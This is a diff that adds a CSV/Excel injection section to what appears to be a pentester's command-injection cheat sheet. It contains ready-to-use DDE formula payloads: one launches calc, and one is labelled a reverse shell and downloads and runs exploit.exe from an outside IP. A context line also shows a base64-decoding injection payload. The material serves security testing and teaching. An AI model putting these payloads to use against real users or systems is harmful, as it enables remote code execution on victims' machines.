@@ -76,6 +76,26 @@ vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod
 - [https://github.com/payloadbox/command-injection-payload-list](https://github.com/payloadbox/command-injection-payload-list)
 - [https://github.com/PortSwigger/command-injection-attacker](https://github.com/PortSwigger/command-injection-attacker)
 
+---
+# Command Injection inside files
+
+## Excel (CSV Injection)
+
+Trigger the calculator app: [^csv-injection]
+
+[^csv-injection]: [CSV Injection: How a Simple Spreadsheet Can Hack Your Computer; Ali Hussain](https://medium.com/@ghostxploiter/how-a-simple-spreadsheet-can-hack-your-computer-csv-injection-98f4a26c4957)
+
+```
+=cmd|'/C calc'!A0,
+```
+
+Execute reverse shell:
+
+```
+=cmd|' /C powershell Invoke-WebRequest "http://192.168.1.6:80/exploit.exe" -OutFile "$env:Temp\exploit.exe"; Start-Process "$env:Temp\exploit.exe"'!'A1'
+```
+
+---
 # External References
 
 - [Hunting asynchronous vulnerabilities](https://portswigger.net/research/hunting-asynchronous-vulnerabilities)
